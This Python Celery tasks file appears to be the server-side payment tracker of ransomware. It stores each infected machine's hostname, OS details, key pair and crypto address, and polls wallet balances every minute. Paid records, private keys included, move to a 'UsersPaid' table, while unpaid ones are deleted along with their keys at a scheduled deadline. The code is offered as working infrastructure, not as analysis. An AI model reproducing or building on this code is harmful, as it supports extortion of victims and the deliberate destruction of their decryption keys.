from app import celery, db, app
from application.models import Users, UsersPaid
from utilities.wallet_api import wallet_api
from datetime import datetime
import pytz
from celery.schedules import crontab


tz = pytz.timezone('America/Toronto')


@celery.task
def terminate_user(id):
	with app.app_context():
		user = Users.query.get(id)
		if user:
			print(f"Deleting user: {user.uid}")
			db.session.delete(user)
			db.session.commit()


def schedule_termination(id, expiration):
	terminate_user.apply_async(args=[id], eta=expiration)


@celery.task
def check_wallet():
	with app.app_context():
		users = Users.query.all()
		for user in users:
			try:
				balance = wallet_api(user.crypto_address)
				if balance > 0:
					user.amount_paid = balance
					if user.amount_paid >= user.total_payment and not user.status:
						user.status = True
						paid_user = UsersPaid(
							username=user.username,
							hostname=user.hostname,
							uid=user.uid,
							os_name=user.os_name,
							os_version=user.os_version,
							os_architecture=user.os_architecture,
							email=user.email,
							public_key=user.public_key,
							private_key=user.private_key,
							crypto_address=user.crypto_address,
							total_payment=user.total_payment,
							status=True,
							amount_paid=user.amount_paid,
							creation_date=user.creation_date,
							payment_date=datetime.now(tz=tz)
						)
						db.session.add(paid_user)
						db.session.delete(user)
			except Exception as e:
				print(e)
			db.session.commit()


celery.conf.beat_schedule = {
	"check-wallet": {
		'task': 'application.tasks.check_wallet',
		'schedule': crontab(minute='*/1')
	}
}


